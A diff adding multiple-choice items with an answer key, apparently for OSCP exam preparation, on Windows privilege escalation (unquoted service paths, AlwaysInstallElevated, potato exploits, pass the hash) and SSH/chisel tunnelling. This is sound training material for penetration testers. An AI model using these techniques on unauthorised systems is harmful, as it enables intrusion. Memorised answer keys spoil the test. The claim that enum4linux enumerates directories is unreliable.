+                "Recompile the kernel from source to remove the vulnerable driver"
+            ],
+            "correct_index": 1,
+            "explanation": "Kernel exploits are version specific, so verifying distribution, version and architecture prevents a crash, while blind compatibility claims are false, disabling protections proves nothing about fit, and recompiling is not a verification step.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-051",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "A Windows service has an unquoted image path containing spaces and it points into a folder the current user may write to. Which weakness allows code to run under the service account?",
+            "options": [
+                "The service always runs as SYSTEM regardless of its configured logon account",
+                "The binary is loaded from a network share instead of the local disk",
+                "Windows resolves the spaced path ambiguously, so a planted executable earlier in the search order runs first",
+                "The service ignores file permissions on its configuration directory"
+            ],
+            "correct_index": 2,
+            "explanation": "Without quotes the service control manager tries shorter prefixes such as Program.exe before the real path, so a planted file wins, while the logon account, load location and permission handling are unrelated to that parsing behaviour.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-052",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "Both the per user and machine policy keys report AlwaysInstallElevated set to one. Which action produces a SYSTEM level shell on this host?",
+            "options": [
+                "Open an elevated command prompt from the Start menu as the current user",
+                "Add the account to the local administrators group with net localgroup",
+                "Change the file associations for executable files",
+                "Install a crafted MSI package because the installer service runs with elevated privileges"
+            ],
+            "correct_index": 3,
+            "explanation": "When both policy keys allow it, msiexec installs packages with SYSTEM rights, while an elevated prompt still uses the current token, group changes need rights the user lacks, and file associations have no privilege impact.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-053",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "An administrator previously used the save credential switch on this shared workstation and never cleared it. Which command reuses that stored credential to start a program?",
+            "options": [
+                "runas with the savecred switch and the stored administrator account",
+                "whoami with the privileges switch",
+                "cmdkey with the list switch",
+                "net user with a new password for the administrator"
+            ],
+            "correct_index": 0,
+            "explanation": "A saved credential lets runas start the program without prompting again, while listing privileges or stored entries is read only, and changing the password requires rights the current user does not hold.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-054",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "whoami reports that the service account holds SeImpersonatePrivilege. Which technique converts that privilege into code execution as SYSTEM?",
+            "options": [
+                "Disabling endpoint protection and rescanning the host",
+                "Token impersonation using a potato style exploit against a privileged service token",
+                "Editing the SAM database directly from the current session",
+                "Changing the service logon type to a network account"
+            ],
+            "correct_index": 1,
+            "explanation": "SeImpersonatePrivilege allows impersonating a higher token, which potato style exploits abuse to reach SYSTEM, while disabling protection, editing the SAM and changing logon type need privileges the account does not have.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-055",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "A local administrator hash recovered earlier matches the hash on this second host. Which technique authenticates to the second host without recovering the password?",
+            "options": [
+                "Offline brute force of the hash with a GPU wordlist attack",
+                "Installing a keylogger and waiting for an interactive login",
+                "Pass the hash by supplying the captured NTLM hash to a remote execution tool",
+                "Resetting the password by editing the registry offline"
+            ],
+            "correct_index": 2,
+            "explanation": "Pass the hash replays the stored hash directly to the remote service and never needs the plaintext, while cracking, keylogging and offline resets need time, presence or rights that replay avoids entirely.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-056",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "Through an established SSH session the attacker wants a port on the attacking machine to reach a web service that only the compromised host can access. Which option performs that forwarding?",
+            "options": [
+                "-R 8080:127.0.0.1:80",
+                "-D 1080",
+                "-N -f",
+                "-L 8080:127.0.0.1:80"
+            ],
+            "correct_index": 3,
+            "explanation": "-L binds a local port and tunnels it so the destination is reached from the remote side, while -R exposes a remote listener back toward the attacker, -D creates a SOCKS proxy, and -N -f only controls shell and background behaviour.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-057",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "An internal host must be able to reach a service the attacker runs, and only an outbound SSH connection may be established. Which option creates the needed listener on the remote side?",
+            "options": [
+                "-R 4444:127.0.0.1:4444",
+                "-L 4444:127.0.0.1:4444",
+                "-D 1080",
+                "-o StrictHostKeyChecking=no"
+            ],
+            "correct_index": 0,
+            "explanation": "-R asks the remote SSH daemon to listen and forwards that traffic back through the session to the attacker, while -L goes the other direction, -D makes a SOCKS proxy, and the final option only relaxes host key checks.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-058",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "Further pivoting needs a generic SOCKS entry point that other tools can be pointed at instead of forwarding one fixed port. Which SSH option provides that proxy?",
+            "options": [
+                "-L 1080:127.0.0.1:80",
+                "-D 1080",
+                "-R 1080:127.0.0.1:80",
+                "-N"
+            ],
+            "correct_index": 1,
+            "explanation": "-D opens a dynamic SOCKS proxy that decides destinations per connection, while -L and -R forward a single fixed port in one direction, and -N only suppresses the interactive remote shell.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-059",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "A SOCKS proxy listens locally, but a raw packet scan would bypass or break it. Which combination scans an internal range through that proxy correctly?",
+            "options": [
+                "nmap -sS -Pn 10.10.11.0/24",
+                "hping3 -S 10.10.11.5",
+                "proxychains4 nmap -sT -Pn 10.10.11.0/24",
+                "nping --tcp 10.10.11.5"
+            ],
+            "correct_index": 2,
+            "explanation": "The proxy carries only normal TCP connections, so a full connect scan must be forced through it, while the other three craft raw packets that a SOCKS proxy cannot transport.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-060",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "No SSH client exists on the pivot host and only one outbound TCP port is allowed, yet a persistent tunnelling channel is still needed. Which tool fits this situation?",
+            "options": [
+                "enum4linux",
+                "sqlmap",
+                "onesixtyone",
+                "chisel"
+            ],
+            "correct_index": 3,
+            "explanation": "chisel runs a small client and server pair over HTTP or raw TCP with reverse mode for pivots, while enum4linux enumerates directories, sqlmap tests injection, and onesixtyone brute forces SNMP community strings.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        }
+    ]
+}
